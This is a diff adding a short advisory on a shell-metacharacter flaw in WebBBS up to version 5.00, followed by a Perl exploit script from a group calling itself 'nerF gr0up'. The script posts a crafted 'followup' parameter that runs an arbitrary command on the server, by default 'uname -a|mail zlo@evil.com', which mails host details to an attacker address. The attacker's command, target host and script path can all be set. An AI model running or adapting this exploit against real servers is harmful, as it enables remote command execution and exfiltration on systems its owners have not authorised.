@@ -1,0 +1,69 @@
+source: http://www.securityfocus.com/bid/5048/info
+
+WebBBS does not sufficiently filter shell metacharacters from CGI parameters. As a result, remote attackers may execute arbitrary commands on the underlying shell of the system hosting the vulnerable software.
+
+Remote attackers may gain local, interactive access to the host with the privileges of the webserver process as a result of successful exploitation.
+
+#!/usr/bin/perl
+#
+#  nerF gr0up
+#
+#  exploit code for
+#  WebBBS by Darryl C. Burgdorf
+#  all version up to 5.00 are vulnerable
+#
+#
+#  this is an exploitation of "followup" bug.
+#  it allows remote attacker to execute shell
+commands.
+#  you can find WebBBS script at
+http://awsd.com/scripts/webbbs/
+#
+#  06.06.2002
+#  btr // nerf
+# nerf.ru
+
+use IO::Socket;
+
+        srand();
+        $script = "/cgi-bin/webbbs/webbbs_config.pl";
+        $command = "uname -a|mail zlo@evil.com";
+        $host = "localhost";
+        $port = 80;
+
+        $content = "$content" . "name=" . rand(254);
+        $content = "$content" . "&email=" . rand(254);
+        $content = "$content" . "&subject=" .
+rand(254);
+        $content = "$content" . "&body=" . rand(254);
+
+$content="$content"."&followup=".rand(254)."|$command|";
+
+        $content_length = length($content);
+        $content_type =
+"application/x-www-form-urlencoded";
+
+        if (@ARGV[0]) {$command=@ARGV[0];}
+        if (@ARGV[1]) {$host=@ARGV[1];}
+        if (@ARGV[2]) {$script=@ARGV[2];}
+
+        $buf = "POST " . "$script" . "?post
+HTTP/1.0\n";
+        $buf = "$buf" . "Content-Type:
+$content_type\r\nContent-Length:";
+        $buf = "$buf" .
+"$content_length\r\n\r\n$content", 0;
+
+        print "\tnerF gr0up\n";
+        print "exploit: WebBBS (awsd.com), version up
+to 5.00\n";
+
+        print "sent:\n$buf\n";
+
+if($socket = IO::Socket::INET->new("$host:$port")){
+
+        print $socket "$buf";
+        read($socket,$buf,1500);
+        print "recieved:\n$buf\n";
+}
+
